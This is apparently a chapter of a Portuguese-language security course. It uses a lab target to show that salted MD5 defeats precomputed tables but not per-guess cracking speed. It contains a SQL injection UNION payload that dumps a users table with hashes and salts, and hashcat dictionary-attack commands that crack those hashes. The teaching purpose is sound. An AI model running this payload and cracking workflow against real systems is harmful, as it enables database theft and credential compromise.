+++
date = 2026-01-01
title = "Salt quebra a pré-computação, não a velocidade"
weight = 203
[extra]
part = 2
section = 3
read_time_minutes = 11
hands_on_minutes = 20
+++

## Recapitulando

`users_md5` caiu pra uma consulta de índice, sem GPU nenhuma, porque a tabela de lookup já estava pronta antes do ataque começar. Dito isso, é hora de adicionar um pouco de tempero!

## A tabela `users_md5_salt`

Adapta a mesma técnica de injeção de sempre pra esta tabela, lembrando que agora são 3 colunas, não 2. Se você copiar o `UNION SELECT user, pass` dos capítulos anteriores sem pensar na coluna extra, a query nem roda.

`data`, depois do dump correto:

```json
[
  {"user": "admin", "pass": "1c30a3032a6e5e95995d3c86773a6f36", "salt": "fe4fe322223cf66a"},
  {"user": "anakin", "pass": "755f52b82df6507c0f9f9721c59895b5", "salt": "bf7623b44fff488c"},
  {"user": "obiwan", "pass": "1ad936f857de169fffaefbec7b551713", "salt": "951569bca6a72998"},
  {"user": "ahsoka", "pass": "22d61ef01983a39b400340c1360cc755", "salt": "ec4d44ff1b67cd51"}
]
```

Assim como no capítulo anterior, essa não é a tabela inteira: existe uma quinta linha, de `holonet-ci`, que se comporta de um jeito diferente das outras quatro. Guarda essa observação pra mais tarde.

## Primeiro, tenta a ferramenta do capítulo anterior

Cola o hash de `admin`, `1c30a3032a6e5e95995d3c86773a6f36`, no `seminc2026-rainbowtable.bortoli.phd`.

Não bate com nada. O índice foi construído sobre `md5(senha)` pura, e aqui o hash inclui o salt na entrada da função. Mesmo com `admin` presente na wordlist que alimentou aquele índice, o salt aleatório de 16 caracteres hex muda a entrada inteira do hash. Ele não deixa o MD5 mais lento nem mais resistente por tentativa: torna inútil qualquer tabela pré-computada genérica, já que a tabela precisaria ser recalculada especificamente para cada salt, e cada usuário tem um salt diferente.

## Craqueando de fato: hashcat

Se a tabela pré-computada não serve mais, sobra o caminho que ela existia justamente pra evitar: computar o hash em tempo real, pra cada tentativa, contra uma wordlist. É isso que uma ferramenta como o hashcat faz, e faz rápido, porque MD5 continua sendo um algoritmo leve.

Duas coisas você precisa descobrir antes de rodar qualquer coisa:

O HoloNet pode ter implementado `md5(senha + salt)` ou `md5(salt + senha)` (ou inúmeras outras formas), e o hashcat trata essas duas situações como modos de ataque numerados diferentes (não existe um modo único "md5 com salt").

Ferramentas de cracking de hash com salt geralmente esperam o par hash e salt juntos, um formato específico por linha, um usuário por linha.

**Mão na massa.** Com os 4 pares hash+salt do dump acima, monta o arquivo de entrada no formato que o hashcat espera pro modo de ataque com salt, escolhe entre os dois modos possíveis pra concatenação `senha+salt`, e roda um ataque de dicionário contra uma wordlist conhecida (
`curl -O http://seminc2026-pingpong.bortoli.phd/wordlist.txt`
 do capítulo anterior). Se o modo escolhido estiver errado, você vai notar pela ausência total de resultado. Esse é o sinal pra tentar o outro.

## O raio de impacto de `users_md5_salt`, a lição central do módulo

Quebrável com esforço: salt quebra o reaproveitamento de pré-computação, mas não faz nada contra a velocidade por tentativa.

Contra senhas fracas, as que aparecem no vazamento `rockyou.txt`, por exemplo, com ou sem uma mutação simples, isso ainda quebra rápido, porque o gargalo nunca foi a pré-computação, foi a fraqueza da senha em si. O salt matou o reaproveitamento, mas o algoritmo continua barato demais pra segurar a porta sozinho.

## O que vem a seguir

E se, além do salt, o hash em si fosse caro de computar? Caro em recursos, de um jeito que uma GPU não contorne só rodando mais threads em paralelo. É esse esquema que fecha o módulo.

<details>
<summary>Se travar de verdade: a solução (não abra antes de tentar)</summary>

A injeção com as 3 colunas:

```text
' UNION SELECT user, pass, salt FROM users_md5_salt --
```

A concatenação que o HoloNet usa é `md5(senha + salt)`, senha primeiro. O modo de hashcat correspondente é `-m 10`. (Se fosse a ordem inversa, `salt + senha`, seria `-m 20`.)

O arquivo de entrada, formato `hash:salt`, um par por linha:

```text
1c30a3032a6e5e95995d3c86773a6f36:fe4fe322223cf66a
755f52b82df6507c0f9f9721c59895b5:bf7623b44fff488c
1ad936f857de169fffaefbec7b551713:951569bca6a72998
22d61ef01983a39b400340c1360cc755:ec4d44ff1b67cd51
```

O comando:

```bash
hashcat -m 10 -a 0 hashes.txt rockyou.txt
```

`-a 0` é ataque de dicionário puro, usando apenas a wordlist apontada.

</details>
